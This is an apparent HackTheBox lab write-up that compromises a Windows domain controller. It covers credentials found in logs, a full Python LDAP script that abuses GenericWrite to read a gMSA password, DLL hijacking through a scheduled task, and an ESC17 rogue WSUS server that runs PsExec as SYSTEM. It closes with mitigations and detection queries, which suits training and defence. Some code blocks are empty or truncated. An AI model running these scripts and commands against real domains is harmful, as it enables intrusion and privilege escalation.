## Executive Summary

This report documents the complete attack chain against the HackTheBox machine **Logging**, a Windows Server 2019 Domain Controller. An initial set of credentials (`wallace.everette:Welcome2026@`) was provided as the assumed-breach starting point.

**Attack Chain Summary:**

1. **Credential Discovery in Log Files:** SMB enumeration revealed a non-default `Logs` share accessible to `wallace.everette`. A log file (`IdentitySync_Trace_20260219.log`) contained a plaintext connection context dump with the credentials for `svc_recovery`. The password in the log was for the previous year (`2025`), but an adaptive year-based mutation attack revealed the current password (`Em3rg3ncyPa$$2026`).

2. **gMSA Password Read via GenericWrite (svc_recovery to msa_health$):** BloodHound identified that `svc_recovery` had `GenericWrite` over the Group Managed Service Account `msa_health$`. By modifying the `msDS-GroupMSAMembership` security descriptor via LDAP, `svc_recovery` was granted permission to read the gMSA password. The NT hash for `msa_health$` was then retrieved using `gMSADumper`. An alternative path using Shadow Credentials (`certipy shadow auto`) was also demonstrated.

3. **Scheduled Task DLL Hijacking (msa_health$ to jaylee.clifton):** WinRM access as `msa_health$` revealed a PowerShell monitoring script and a scheduled task `UpdateChecker Agent` running every 3 minutes as `jaylee.clifton`. The task executed `UpdateMonitor.exe`, which was reverse engineered (ILSpy) to reveal that it: (a) looks for `C:\ProgramData\UpdateMonitor\Settings_Update.zip`; (b) extracts it to `C:\Program Files\UpdateMonitor\bin\`; and (c) loads and calls `PreUpdateCheck()` from `settings_update.dll`. A malicious DLL was compiled and placed in a ZIP file in the monitored directory, yielding code execution as `jaylee.clifton`.

4. **WSUS Rogue Server (ESC17) to SYSTEM:** `jaylee.clifton` was a member of the `IT` group and had `SeMachineAccountPrivilege`. The `WUServer` registry key pointed to `https://wsus.logging.htb:8531`, which had no DNS record. A fake computer account and a DNS A record for `wsus.logging.htb` pointing to the attacker machine were created. Using ESC17, a valid TLS certificate for `wsus.logging.htb` was enrolled from the `UpdateSrv` template (which allowed Enrollee Supplied Subject + Server Authentication EKU). A rogue WSUS server (`wsuks`) was started, serving PsExec as a signed Microsoft update, executing `net localgroup administrators msa_health$ /add` as `NT AUTHORITY\SYSTEM`.

**Impact:** Complete domain compromise. All domain user and machine credentials dumped via DCSync.

## Kerberos Authentication — STATUS_ACCOUNT_RESTRICTION & faketime

Validating the `svc_recovery` credentials via NTLM returned an STATUS_ACCOUNT_RESTRICTION error:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Logging]
└─$ netexec smb $ip -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
SMB         10.129.28.188   445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION 
```

**`STATUS_ACCOUNT_RESTRICTION`** is a Windows error code that is returned when a user account has restrictions that prevent NTLM authentication. The most common cause in AD environments is membership in the **Protected Users** security group. But it can also be the case where NTLM authentication is disabled across the whole domain. Members of Protected Users:
- Cannot authenticate with NTLM (NTLMv1 or NTLMv2)
- Cannot use DES or RC4 for Kerberos encryption
- Cannot use unconstrained delegation
- Kerberos TGTs expire after 4 hours

This forces the attacker to switch to **Kerberos authentication** (`-k` flag in NetExec/Impacket).

A Kerberos configuration file was generated and the clock offset was measured:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Logging]

┌──(kali㉿kali)-[~/HTB/AD/Logging]
```

## svc_recovery to msa_health$ (gMSA Abuse via GenericWrite)

BloodHound identified a critical ACL relationship:

<img src="assets/img/logging/genericwrite.png" alt="error loading image">

`svc_recovery` has **GenericWrite** over `msa_health$`, a Group Managed Service Account.

### What is a gMSA?

A **Group Managed Service Account (gMSA)** is a type of Active Directory account introduced in Windows Server 2012 for running services without human-managed passwords. Key properties:

- The password is a 256-byte cryptographically random value, automatically rotated by the KDC every 30 days.
- The password is stored in the `msDS-ManagedPassword` LDAP attribute — readable only by principals listed in the `msDS-GroupMSAMembership` security descriptor.
- gMSA accounts have a `$` suffix by convention (e.g., `msa_health$`).
- They are used to run services (IIS app pools, scheduled tasks, Windows services) without requiring hardcoded passwords.

The `msDS-GroupMSAMembership` attribute is an **Access Control List (ACL)** that specifies which principals are allowed to retrieve the managed password. It is stored as a binary Security Descriptor (`SD`) object.

### The GenericWrite to msDS-GroupMSAMembership Attack

`GenericWrite` over an AD object means the attacker can **write any non-protected attribute** on that object. For a gMSA, this includes `msDS-GroupMSAMembership`.

Two attack paths are possible when holding `GenericWrite` over a gMSA:

1. **Direct GMSA Password Read:** Modify `msDS-GroupMSAMembership` to include `svc_recovery`'s SID, then call the gMSA password retrieval API as `svc_recovery`. This works even without ADCS.

2. **Shadow Credentials (requires ADCS):** Modify the `msDS-KeyCredentialLink` attribute to add a Key Credential (certificate-based authentication credential) for the gMSA, then request a TGT using the PKINIT protocol with the attacker-generated certificate. This yields the NT hash.

### grant_gmsa_read.py — Annotated

```python
# grant_gmsa_read.py
# Purpose: Modify the msDS-GroupMSAMembership ACL on msa_health$ to add svc_recovery
import ldap3
from impacket.ldap import ldaptypes

# Connect using SASL/GSSAPI (Kerberos) — uses the TGT in KRB5CCNAME env var
s = ldap3.Server('10.129.35.29')
c = ldap3.Connection(
    s,
    authentication=ldap3.SASL,
    sasl_mechanism=ldap3.KERBEROS,
    auto_bind=True
)

# SID of the principal to be granted ReadGMSAPassword permission
# This should be svc_recovery's SID from BloodHound
sid = 'S-1-5-21-4020823815-2796529489-1682170552-2104'

# Construct a Security Descriptor (SD) for the msDS-GroupMSAMembership attribute.
# An SD has: Revision, Control flags, Owner SID, Group SID, SACL, DACL
sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 32772          # SE_DACL_PRESENT | SE_SELF_RELATIVE
sd['OwnerSid'] = ldaptypes.LDAP_SID(); sd['OwnerSid'].fromCanonical('S-1-5-18')  # SYSTEM
sd['GroupSid'] = b''
sd['Sacl'] = b''

# Build the DACL (Discretionary ACL) with a single ACE (Access Control Entry)
acl = ldaptypes.ACL(); acl['AclRevision'] = 4; acl['Sbz1'] = 0; acl['Sbz2'] = 0

# ACE type 0 = ACCESS_ALLOWED_ACE — grants access
ace = ldaptypes.ACE(); ace['AceType'] = 0; ace['AceFlags'] = 0

# ACCESS_ALLOWED_ACE grants full access (mask 0xF01FF = 983551 = GENERIC_ALL)
nace = ldaptypes.ACCESS_ALLOWED_ACE(); nace['Mask'] = ldaptypes.ACCESS_MASK()
nace['Mask']['Mask'] = 983551  # Full access mask — allows reading the managed password

# Target SID: the account to be granted read access to the gMSA password
nace['Sid'] = ldaptypes.LDAP_SID(); nace['Sid'].fromCanonical(sid)

ace['Ace'] = nace
acl.aces = [ace]; sd['Dacl'] = acl

# Apply the new security descriptor via LDAP MODIFY_REPLACE
# Targets the msDS-GroupMSAMembership attribute of msa_health$
c.modify('CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb', 
         {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [sd.getData()])]})
print(c.result)  # Should print: {'result': 0, 'description': 'success', ...}
```

### Alternative: Shadow Credentials via certipy

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute. `certipy shadow auto` performs the full attack chain automatically: generates a keypair, adds the Key Credential to the target account via LDAP, authenticates with PKINIT, retrieves the TGT, and recovers the NT hash — then restores the original `msDS-KeyCredentialLink` value:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Logging]
```

- The task runs as `jaylee.clifton`, so the DLL executes in `jaylee.clifton`'s security context.

## Privilege Escalation — WSUS Rogue Server Attack (ESC17)

### What is WSUS?

**Windows Server Update Services (WSUS)** is a Microsoft server role that allows IT administrators to centralise patch management across an Active Directory domain. Instead of each workstation downloading updates directly from Microsoft, they check in with the internal WSUS server for approved updates.

**Why WSUS is a high-value attack target:**
- The Windows Update client (`wuauserv` service) runs as `NT AUTHORITY\SYSTEM`.
- It downloads and executes update packages, which must be **signed by Microsoft** (not arbitrary binaries).
- However, legitimate Microsoft-signed tools like **PsExec** from Sysinternals can be wrapped as a "fake update" package with attacker-controlled command-line arguments.
- When the WSUS server is trusted (valid SSL certificate), the client will download and execute the PsExec-wrapped payload as `NT AUTHORITY\SYSTEM`.

In September 2024, Microsoft officially [announced WSUS deprecation](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436). Despite being deprecated, WSUS is still fully supported in Windows Server 2025 and remains a viable attack surface in environments that haven't migrated to Windows Update for Business or Intune.

### WSUS Registry Configuration

The WSUS server URL is pushed via Group Policy and stored in the registry:


### ESC17 — Obtaining a Valid TLS Certificate for wsus.logging.htb

#### ESC17 Technical Deep Dive

**ESC17** is an Active Directory Certificate Services (ADCS) attack technique that chains two misconfigurations:

1. **Enrollee Supplies Subject** — A certificate template has the "Supply in the request" option enabled for the Subject Name. This means the requester controls the `CN`, `SAN` (Subject Alternative Name), and any other subject fields — the CA does not enforce them.

2. **Server Authentication EKU** — The template includes the `Server Authentication` Extended Key Usage (OID `1.3.6.1.5.5.7.3.1`). This EKU is what Windows trusts for TLS server certificates.

When both conditions are met, any user with enrollment rights on that template can request a **valid, CA-signed TLS certificate for any hostname** — including one controlled by the attacker. This certificate will be trusted by all domain-joined machines, since the CA is a trusted root in the domain's PKI.

In this scenario, the attacker uses ESC17 to obtain a TLS certificate for `wsus.logging.htb`, which is then used to impersonate the WSUS server over HTTPS — bypassing the SSL validation that was supposed to protect WSUS clients.

### Delivering the Rogue WSUS Update — wsuks

**`wsuks`** implements a rogue WSUS server. It:
1. Listens on port 8531 with TLS using the provided certificate.
2. Responds to WSUS SOAP protocol messages (`ClientWebService/client.asmx` endpoints).
3. Serves **PsExec64.exe** (a legitimate Microsoft-signed Sysinternals binary) disguised as a Windows Update package (KB article).
4. The WSUS client downloads and runs the "update" as `NT AUTHORITY\SYSTEM`.
5. PsExec is used to execute a custom command as SYSTEM using its `/s` flag.

The command was set to add `msa_health$` to the local Administrators group (providing persistent privileged access via WinRM):

```shell
┌──(kali㉿kali)-[~/HTB/AD/Logging]
└─$ sudo wsuks --WSUS-Server 10.10.15.113 --tls-cert wsus.pem -I tun0 --serve-only -c '/accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add"'

[+] Command to execute: 
PsExec64.exe /accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add"
[*] ===== Starting Web Server =====
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 10.10.15.113:8531...
[*] Serving executable as KB: 3426191
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "...GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "...GetConfig"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "...SyncUpdates"
```

**WSUS SOAP protocol flow:**

5. `GET PsExec64.exe` — client downloads the binary and executes it as SYSTEM.

After the Windows Update client on DC01 contacted `wsus.logging.htb:8531` (our rogue server), PsExec ran the `net localgroup administrators msa_health$ /add` command as `NT AUTHORITY\SYSTEM`.

## Alternative Path — certreq CSR from WinRM Session

An alternative technique for obtaining the WSUS TLS certificate without needing `jaylee.clifton`'s credentials was discovered. A Certificate Signing Request (CSR) was generated on Kali and submitted to ADCS via `certreq.exe` from within the `msa_health$` WinRM session — relying on `jaylee.clifton`'s execution context when the malicious DLL runs:

**Step 1:** Generate RSA keypair and CSR on Kali:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Logging]
└─$ openssl req -newkey rsa:2048 -nodes -keyout wsus.key -out wsus.csr -subj "/CN=wsus/CN=Computers/DC=logging/DC=htb" -addext "subjectAltName=DNS:wsus.logging.htb"
```

**Step 2:** Upload the CSR to the target machine via WinRM and run `certreq` from the DLL:

```c
// In command.c:
system("certreq -submit -attrib \"CertificateTemplate:UpdateSrv\" -config \"DC01.logging.htb\\logging-DC01-CA\" C:\\Programdata\\UpdateMonitor\\wsus.csr C:\\Programdata\\UpdateMonitor\\wsus.cer 2>&1 <NUL && icacls C:\\Programdata\\UpdateMonitor\\wsus.cer /grant Everyone:F");   
```

**Step 3:** Copy the issued certificate back to Kali and combine with the private key:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Logging]
└─$ cat wsus.key wsus.cer > wsus.pem
```

This technique is useful when an outbound network connection from the compromised machine is blocked (no reverse shell possible), but the CSR approach only requires the file system and ADCS RPC access.

## Mitigations & Recommendations

### 1. Remove Plaintext Credentials from Log Files

**Action:** Audit all application logging configurations. Verbose-level logs must never include sensitive fields like passwords, even in "bind context" dumps.

{% raw %}
```csharp
// BAD: logs the full connection context including password
Log(logPath, $"VERBOSE - ConnectionContext Dump: {JsonSerializer.Serialize(context)}");

// GOOD: redact sensitive fields before logging
Log(logPath, $"VERBOSE - ConnectionContext Dump: {{ Domain: \"{context.Domain}\", Server: \"{context.Server}\", BindUser: \"{context.BindUser}\", BindPass: \"[REDACTED]\" }}");
```
{% endraw %}

**Root Cause:** The identity synchronisation service was configured at VERBOSE log level with a connection context serialiser that included the `BindPass` field. These logs were placed on an SMB share accessible to general users.

---

### 2. Restrict Access to the Logs Share

**Action:** Apply least-privilege permissions to the `Logs` SMB share. Only service accounts and administrators that need to read logs should have access.

```powershell
# Remove Everyone/Domain Users access from the Logs share
$acl = Get-Acl "\\DC01\Logs"
$acl.Access | Where-Object { $_.IdentityReference -like "LOGGING\Domain Users" } | ForEach-Object { $acl.RemoveAccessRule($_) }
Set-Acl "\\DC01\Logs" $acl
```

---

### 3. Enforce Strong, Unique Service Account Password Policy

**Action:** Implement a password rotation policy that prevents predictable patterns:
- Prohibit year-appended passwords (e.g., `Em3rg3ncyPa$$2026`).
- Use a secrets management solution (LAPS for service accounts, CyberArk, or similar).
- Consider replacing password-based service accounts with **Managed Service Accounts (MSA/gMSA)** for services that don't need domain-trusted credentials.

**Root Cause:** The `svc_recovery` account password followed a year-based rotation pattern, allowing the password from the previous year to be mutated into the current year's password.

---

### 4. Audit and Remediate GenericWrite ACLs on gMSA Accounts

**Action:** Regularly audit AD ACLs for over-privileged delegations, especially for gMSA objects:

```powershell
# Find all ACEs granting GenericWrite or WriteDACL on gMSA objects
Get-ADObject -Filter { objectClass -eq "msDS-GroupManagedServiceAccount" } |
    ForEach-Object { (Get-Acl "AD:\$($_.DistinguishedName)").Access } |
    Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|WriteDACL|WriteOwner" -and $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins" }
```

**Root Cause:** `svc_recovery` was granted `GenericWrite` on the `msa_health$` gMSA, which is functionally equivalent to granting full credential access to the gMSA — anyone with `GenericWrite` can modify `msDS-GroupMSAMembership` to grant themselves ReadGMSAPassword.

---

### 5. Fix DLL Hijacking in UpdateMonitor — Sign and Validate DLLs

**Action:** The `UpdateMonitor.exe` application must be redesigned to:
- Verify the digital signature of `settings_update.dll` before loading it.
- Store the DLL update package in a path accessible only to the service account (not in `C:\ProgramData\`).
- Use Windows Catalog signing or Authenticode to validate the ZIP package.

```csharp
// Verify DLL signature before loading
var cert = X509Certificate.CreateFromSignedFile(dllFull);
if (cert == null || !IsTrustedCertificate(cert)) {
    Log(logPath, "ERROR: DLL signature verification failed. Aborting.");
    return;
}
```

**Root Cause:** `C:\ProgramData\UpdateMonitor\` is writable by authenticated domain users by default. The application loaded an unsigned DLL from this path without any verification, enabling any local or domain user with network access to plant a malicious DLL.

---

### 6. Add the wsus.logging.htb DNS Record (or Remove the GPO)

**Action:** Either:
- Create an accurate DNS A record for `wsus.logging.htb` pointing to the real WSUS server.
- Or remove the Group Policy that sets `WUServer`/`WUStatusServer` if WSUS is no longer in use.

```powershell
# Remove stale WSUS GPO settings
Set-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" -ValueName "WUServer" -Type String -Value ""
```

**Root Cause:** A DNS record for `wsus.logging.htb` was never created (or was deleted), allowing an attacker with DNS write access to point the hostname to a rogue server. Any domain user can add DNS records in AD-integrated DNS by default.

---

### 7. Restrict DNS Record Creation to Authorised Users

**Action:** Remove the default permission that allows all authenticated users to create DNS records:

```powershell
# Restrict DNS record creation to DNS Admins only
$acl = Get-Acl "AD:\DC=DomainDnsZones,DC=logging,DC=htb"
# Remove 'Authenticated Users' create child permission
# Add only 'DNS Admins' and 'Domain Admins'
```

---

### 8. Audit ADCS Certificate Templates — Remediate ESC17

**Action:** Audit all enabled certificate templates for the "Enrollee Supplies Subject" + "Server Authentication" combination:

```powershell
# Find ESC17-vulnerable templates
Get-CATemplate | Where-Object {
    $_.SubjectType -eq "SuppliedByRequester" -and
    $_.ApplicationPolicy -contains "1.3.6.1.5.5.7.3.1"  # Server Authentication OID
}
```

**Remediation options for `UpdateSrv`:**
- Remove the "Supply in the request" subject flag — have the CA build the subject from AD attributes instead.
- Remove the "Server Authentication" EKU if the template is not intended for TLS servers.
- Restrict enrollment to only the specific service accounts that need it (remove the `IT` group if not required).

**Root Cause:** The `UpdateSrv` template allowed members of the `IT` group to self-issue TLS certificates for any hostname they specified. This is an ESC17 misconfiguration that enables a WSUS MITM attack.

---

### 9. Monitor for Suspicious DNS Record Creation

**Action:** Enable auditing for DNS record modifications and alert on new records created by non-DNS-admin principals:

- Enable Windows DNS Server audit logging.
- Alert on event ID 4662 (Object Operation performed on AD object) for `CN=MicrosoftDNS` objects.
- Review any new A records that match internal service hostnames (e.g., `wsus`, `sccm`, `sms`).

---

### 10. Monitor for Anomalous WSUS Client Behaviour

**Action:** Monitor for Windows Update client traffic to unexpected hosts:

- Use Windows Defender Firewall logs or network monitoring to detect outbound connections to port 8531 from domain machines to non-standard WSUS IPs.
- Alert on event ID 7001 in the Windows Update log when the update source changes.
- Monitor for `wuauclt.exe` or `usoclient.exe` spawning child processes (`cmd.exe`, `powershell.exe`, `PsExec64.exe`).
